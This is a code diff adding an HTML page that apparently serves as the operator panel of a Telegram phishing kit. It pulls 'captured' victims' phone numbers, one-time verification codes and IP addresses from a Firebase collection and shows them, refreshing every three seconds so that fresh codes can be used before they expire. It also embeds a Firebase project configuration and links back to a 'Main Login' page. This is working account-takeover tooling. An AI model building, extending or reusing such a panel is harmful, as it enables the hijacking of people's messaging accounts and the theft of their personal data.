@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Login Data</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Add Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+    <style>
+        /* Your existing CSS styles remain the same */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 20px;
+        }
+
+        .data-container {
+            background-color: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 600px;
+            padding: 40px 30px;
+            text-align: center;
+        }
+
+        .data-header {
+            color: #667eea;
+            margin-bottom: 30px;
+        }
+
+        .data-header i {
+            font-size: 48px;
+            margin-bottom: 15px;
+            color: #0088cc;
+        }
+
+        .data-item {
+            background: #f8f9fa;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 10px;
+            text-align: left;
+            border-left: 4px solid #0088cc;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+
+        .data-label {
+            font-weight: 600;
+            color: #555;
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .data-value {
+            color: #333;
+            font-size: 18px;
+            word-break: break-all;
+        }
+
+        .code-display {
+            font-family: monospace;
+            font-size: 28px;
+            letter-spacing: 8px;
+            background: #e9ecef;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 10px 0;
+            text-align: center;
+            border: 2px dashed #0088cc;
+        }
+
+        .back-btn {
+            display: inline-block;
+            margin-top: 25px;
+            padding: 12px 25px;
+            background: #667eea;
+            color: white;
+            text-decoration: none;
+            border-radius: 8px;
+            transition: all 0.3s;
+            font-weight: 600;
+        }
+
+        .back-btn:hover {
+            background: #5a6fd8;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+        }
+
+        .timestamp {
+            color: #666;
+            font-size: 14px;
+            margin-top: 25px;
+            padding: 10px;
+            background: #f1f3f4;
+            border-radius: 5px;
+        }
+
+        .no-data {
+            text-align: center;
+            padding: 40px 20px;
+            color: #666;
+        }
+
+        .no-data i {
+            font-size: 64px;
+            margin-bottom: 20px;
+            color: #ccc;
+        }
+
+        .refresh-btn {
+            display: inline-block;
+            margin-top: 15px;
+            padding: 8px 16px;
+            background: #0088cc;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            font-size: 14px;
+            transition: all 0.3s;
+        }
+
+        .refresh-btn:hover {
+            background: #0077b3;
+        }
+
+        .data-actions {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin-top: 20px;
+        }
+
+        .clear-btn {
+            display: inline-block;
+            padding: 8px 16px;
+            background: #ef4444;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            font-size: 14px;
+            transition: all 0.3s;
+            border: none;
+            cursor: pointer;
+        }
+
+        .clear-btn:hover {
+            background: #dc2626;
+        }
+    </style>
+</head>
+<body>
+    <div class="data-container">
+        <div class="data-header">
+            <i class="fab fa-telegram"></i>
+            <h2>Telegram Login Data</h2>
+            <p>Captured login information from Telegram authentication</p>
+        </div>
+        
+        <div id="displayData">
+            <!-- Data will be displayed here -->
+        </div>
+        
+        <div class="data-actions">
+            <a href="#" class="refresh-btn" id="refreshBtn">Refresh Data</a>
+            <button class="clear-btn" id="clearBtn">Clear Local Data</button>
+        </div>
+
+        <a href="index.html" class="back-btn">Back to Main Login</a>
+    </div>
+
+    <script>
+        // Firebase configuration - USE SAME CONFIG AS ABOVE
+        const firebaseConfig = {
+    apiKey: "AIzaSyCB47uNdcAYifcxhgRGv-Q9TUAi0Wg5g94",
+    authDomain: "telegram-login-tracker.firebaseapp.com",
+    projectId: "telegram-login-tracker",
+    storageBucket: "telegram-login-tracker.firebasestorage.app",
+    messagingSenderId: "930264969410",
+    appId: "1:930264969410:web:e0bb1717d3ca76ce774b5b",
+    measurementId: "G-5760KLJZJS"
+  };
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        async function displayStoredData() {
+            const displayData = document.getElementById('displayData');
+            
+            try {
+                // Get data from Firebase
+                const snapshot = await db.collection('telegramLogins')
+                    .orderBy('timestamp', 'desc')
+                    .limit(1)
+                    .get();
+                
+                if (!snapshot.empty) {
+                    const latestDoc = snapshot.docs[0];
+                    const data = latestDoc.data();
+                    showData(data, 'Firebase Data (All Devices)');
+                } else {
+                    // Fallback to local storage
+                    const localData = localStorage.getItem('telegramLoginData');
+                    if (localData) {
+                        const data = JSON.parse(localData);
+                        showData(data, 'Local Data (This device only)');
+                    } else {
+                        showNoData();
+                    }
+                }
+                
+            } catch (error) {
+                console.error('Error loading Firebase data:', error);
+                // Fallback to local storage
+                const localData = localStorage.getItem('telegramLoginData');
+                if (localData) {
+                    const data = JSON.parse(localData);
+                    showData(data, 'Local Data (Firebase unavailable)');
+                } else {
+                    showNoData();
+                }
+            }
+        }
+
+        function showData(data, source) {
+            const displayData = document.getElementById('displayData');
+            displayData.innerHTML = `
+                <div class="data-source" style="background: #e3f2fd; padding: 10px; border-radius: 5px; margin-bottom: 15px; text-align: center;">
+                    <strong>Data Source:</strong> ${source}
+                </div>
+                <div class="data-item">
+                    <span class="data-label">Platform</span>
+                    <span class="data-value">${data.platform || 'Telegram'}</span>
+                </div>
+                <div class="data-item">
+                    <span class="data-label">Phone Number</span>
+                    <span class="data-value">${data.phone || 'Not provided'}</span>
+                </div>
+                <div class="data-item">
+                    <span class="data-label">Verification Code</span>
+                    <div class="code-display">${data.code || 'No code'}</div>
+                </div>
+                <div class="data-item">
+                    <span class="data-label">IP Address</span>
+                    <span class="data-value">${data.ip || 'Unknown'}</span>
+                </div>
+                <div class="timestamp">
+                    Last updated: ${data.timestamp ? new Date(data.timestamp).toLocaleString() : 'Unknown'}
+                </div>
+            `;
+        }
+
+        function showNoData() {
+            const displayData = document.getElementById('displayData');
+            displayData.innerHTML = `
+                <div class="no-data">
+                    <i class="fas fa-inbox"></i>
+                    <h3>No Data Available</h3>
+                    <p>No Telegram login data has been captured yet.</p>
+                    <p>Complete the Telegram login process to see data here.</p>
+                </div>
+            `;
+        }
+
+        // Display data when page loads
+        displayStoredData();
+
+        // Refresh button functionality
+        document.getElementById('refreshBtn').addEventListener('click', function(e) {
+            e.preventDefault();
+            displayStoredData();
+            
+            const originalText = this.textContent;
+            this.textContent = 'Refreshing...';
+            setTimeout(() => {
+                this.textContent = originalText;
+            }, 1500);
+        });
+
+        // Clear data button functionality
+        document.getElementById('clearBtn').addEventListener('click', function() {
+            if (confirm('Are you sure you want to clear local data?')) {
+                localStorage.removeItem('telegramLoginData');
+                sessionStorage.removeItem('telegramLoginData');
+                displayStoredData();
+                
+                this.textContent = 'Local Data Cleared!';
+                setTimeout(() => {
+                    this.textContent = 'Clear Local Data';
+                }, 1500);
+            }
+        });
+
+        // Auto-refresh every 3 seconds
+        setInterval(displayStoredData, 3000);
+    </script>
+</body>
+</html>
